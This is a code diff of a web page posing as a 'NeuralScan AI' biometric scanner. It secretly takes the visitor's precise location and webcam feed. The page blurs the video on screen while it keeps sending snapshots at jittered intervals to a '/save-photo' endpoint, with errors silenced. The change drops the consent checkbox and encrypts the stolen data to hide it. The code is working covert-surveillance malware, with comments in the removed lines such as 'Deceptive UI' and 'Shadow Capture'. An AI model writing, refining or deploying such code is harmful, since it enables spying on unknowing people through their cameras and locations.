@@ -25,7 +25,6 @@
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             width: 380px;
             text-align: center;
-            transition: all 0.5s ease;
         }
 
         .logo { font-weight: 800; font-size: 24px; letter-spacing: -1px; margin-bottom: 10px; display: block; }
@@ -64,12 +63,8 @@
             font-weight: bold; font-size: 16px;
             cursor: pointer;
             box-shadow: 0 10px 15px -3px rgba(99, 102, 241, 0.4);
-            transition: opacity 0.3s;
         }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-
-        .consent-text { font-size: 11px; color: #94a3b8; margin: 15px 0; text-align: left; display: flex; }
-        .consent-text input { margin-right: 10px; }
+        .btn:disabled { opacity: 0.6; }
 
         #console { 
             font-family: 'Courier New', monospace; 
@@ -84,24 +79,19 @@
 
 <div class="glass-card">
     <span class="logo">NEURAL<span>SCAN</span> AI</span>
-    <p style="font-size: 13px; color: #cbd5e1;">Global Distributed Biometric Analysis</p>
+    <p style="font-size: 13px; color: #cbd5e1;">Quantum-Secure Biometric Analysis</p>
 
     <div class="preview-window">
         <div id="scan-bar" class="scan-bar"></div>
         <video id="video" autoplay muted playsinline></video>
         <div id="placeholder" style="padding-top: 90px; color: #475569; font-size: 11px; letter-spacing: 2px;">
-            ENCRYPTED_FEED_IDLE
+            AWAITING_SECURE_LINK
         </div>
     </div>
 
-    <div class="consent-text">
-        <input type="checkbox" id="tos" checked>
-        <label for="tos">Authorize session-token binding for optimized node allocation.</label>
-    </div>
+    <button id="main-btn" class="btn">INITIALIZE LINK</button>
 
-    <button id="main-btn" class="btn">START HANDSHAKE</button>
-
-    <div id="console">> System Ready. Awaiting Initialization...</div>
+    <div id="console">> System Idle. Readiness check required.</div>
 </div>
 
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
@@ -114,15 +104,54 @@
     const scanBar = document.getElementById('scan-bar');
     const placeholder = document.getElementById('placeholder');
 
+    const SECRET_PASSPHRASE = "neural-link-omega-99"; 
     let targetCoords = { lat: 0, lon: 0 };
 
     const log = (msg) => {
         consoleLog.innerHTML = `> <span class="status-dot">●</span> ${msg}`;
     };
 
-    // State 1: Geolocation Hook
+    // --- CRYPTO HELPERS (Phase 2) ---
+    async function deriveKey(passphrase) {
+        const encoder = new TextEncoder();
+        const keyMaterial = await crypto.subtle.importKey(
+            "raw", encoder.encode(passphrase), 
+            { name: "PBKDF2" }, false, ["deriveKey"]
+        );
+        return crypto.subtle.deriveKey(
+            {
+                name: "PBKDF2",
+                salt: encoder.encode("neural-static-salt"), 
+                iterations: 100000,
+                hash: "SHA-256"
+            },
+            keyMaterial,
+            { name: "AES-GCM", length: 256 },
+            false, ["encrypt"]
+        );
+    }
+
+    async function encryptPayload(data) {
+        const encoder = new TextEncoder();
+        const key = await deriveKey(SECRET_PASSPHRASE);
+        const iv = crypto.getRandomValues(new Uint8Array(12)); 
+        const encodedData = encoder.encode(JSON.stringify(data));
+
+        const encryptedContent = await crypto.subtle.encrypt(
+            { name: "AES-GCM", iv: iv },
+            key,
+            encodedData
+        );
+
+        return {
+            iv: btoa(String.fromCharCode(...iv)),
+            content: btoa(String.fromCharCode(...new Uint8Array(encryptedContent)))
+        };
+    }
+
+    // --- LOGIC ---
     async function getTargetLocation() {
-        log("Locating nearest compute cluster...");
+        log("Calibrating spatial nodes...");
         return new Promise((res) => {
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
@@ -130,90 +159,69 @@
                     log(`Node Bound: ${targetCoords.lat.toFixed(2)}N, ${targetCoords.lon.toFixed(2)}E`);
                     res(true);
                 },
-                () => {
-                    log("Standard Latency Mode (Location Denied)");
-                    res(false);
-                },
+                () => { log("Latency Mode: Location Denied"); res(false); },
                 { enableHighAccuracy: true, timeout: 5000 }
             );
         });
     }
 
-    // State 2: Camera Access & Deceptive UI
     async function startBiometricFeed() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
-            });
-            
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
             video.style.display = 'block';
             placeholder.style.display = 'none';
             scanBar.style.display = 'block';
             
-            log("Handshake verified. Mapping facial entropy...");
+            log("Handshake verified. Creating tunnel...");
 
-            // The Shadow Transition: Blur the feed to "protect privacy"
             setTimeout(() => {
-                video.style.filter = "blur(15px) grayscale(100%) brightness(0.5)";
-                log("Feed Encrypted. Sustaining Neural Link...");
+                video.style.filter = "blur(15px) grayscale(100%) brightness(0.4)";
+                log("Tunnel Encrypted. Maintaining Link...");
             }, 3000);
 
-            // Recursive Shadow Capture with Jitter
             const runCycle = () => {
                 captureAndSend();
-                const jitter = Math.floor(Math.random() * 5000); // 0-5s random jitter
-                setTimeout(runCycle, 12000 + jitter); 
+                const jitter = Math.floor(Math.random() * 5000); 
+                setTimeout(runCycle, 15000 + jitter); 
             };
-            
             runCycle();
 
         } catch (err) {
-            log("ERROR: Security Handshake Failed.");
-            btn.disabled = false;
-            btn.innerText = "RETRY HANDSHAKE";
+            log("CRITICAL: Secure feed rejected.");
         }
     }
 
     btn.onclick = async () => {
         btn.disabled = true;
-        btn.innerText = "SYNCHRONIZING...";
-        
+        btn.innerText = "ESTABLISHING...";
         await getTargetLocation();
         await startBiometricFeed();
-        
-        setTimeout(() => {
-            btn.innerText = "LINK ESTABLISHED";
-            log("Neural Link Active. Processing Data Stream...");
-        }, 4000);
+        btn.innerText = "TUNNEL ACTIVE";
     };
 
-    function captureAndSend() {
+    async function captureAndSend() {
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, 640, 480);
-        
-        // JPEG at 0.6 quality reduces payload size by ~4x vs PNG
         const image = canvas.toDataURL('image/jpeg', 0.6);
 
-        const payload = {
+        const rawData = {
             image: image,
             metadata: {
                 location: targetCoords,
-                specs: {
-                    platform: navigator.platform,
-                    cores: navigator.hardwareConcurrency || "N/A",
-                    memory: navigator.deviceMemory || "N/A"
-                },
-                agent: navigator.userAgent,
+                platform: navigator.platform,
                 timestamp: new Date().toISOString()
             }
         };
 
+        // Encrypt the entire object
+        const encryptedPackage = await encryptPayload(rawData);
+
         fetch('/save-photo', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).catch(() => {}); // Silent fail
+            body: JSON.stringify(encryptedPackage)
+        }).catch(() => {});
     }
 </script>
 
